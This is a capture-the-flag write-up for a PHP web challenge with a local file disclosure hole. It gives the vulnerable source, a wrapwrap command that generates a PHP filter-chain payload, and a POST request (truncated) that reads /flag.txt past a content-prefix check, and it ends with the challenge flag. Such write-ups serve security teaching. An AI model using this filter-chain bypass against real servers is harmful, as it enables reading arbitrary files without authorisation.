
## Free Flag Writeup

- **Category:** Web
- **Points:** 110
- **Difficulty:** Easy

## Challenge Description

Free Free

## Challenge Code

```php
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Flag</title>
</head>
<body>
    
<?php

function isRateLimited($limitTime = 1) {
    $ipAddress=$_SERVER['REMOTE_ADDR'];
    $filename = sys_get_temp_dir() . "/rate_limit_" . md5($ipAddress);
    $lastRequestTime = @file_get_contents($filename);
    
    if ($lastRequestTime !== false && (time() - $lastRequestTime) < $limitTime) {
        return true;
    }

    file_put_contents($filename, time());
    return false;
}

    if(isset($_POST['file']))
    {
        if(isRateLimited())
        {
            die("Limited 1 req per second");
        }
        $file = $_POST['file'];
        if(substr(file_get_contents($file),0,5) !== "<?php" && substr(file_get_contents($file),0,5) !== "<html") # i will let you only read my source haha
        {
            die("catched");
        }
        else
        {
            echo file_get_contents($file);
        }
    }

?>
</body>
</html>
```

## Exploitation

This challenge presents a Local File Disclosure (LFD) vulnerability, but it restricts the retrieval of files whose contents do start with `<?php` or `<html`. However, by using the wrapwarp script—a modified version of the PHP filter chain generator that supports adding a prefix and suffix—this restriction can be bypassed.

### Exploiting Local File Disclosure

By crafting a malicious payload using the wrapwarp tool, you can bypass the file content check. The following command generates the payload:

```cmd
python wrapwrap.py /flag.txt "<?php" "?>" 100
```

Once the payload is generated, it is sent via a POST request:

```http
POST / HTTP/1.1
Host: a78a1875e57a99f71f265.playat.flagyard.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 81703
Cookie: connect.sid=session;

file=php://filter/convert.base64-encode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-encode...
```

The payload allows the retrieval of the flag by embedding it between `<?php` and `?>`, effectively bypassing the file content check.

### Flag

`BHFlagY{1150be5e64bbcd3a2a2d2dfba76fe546}`
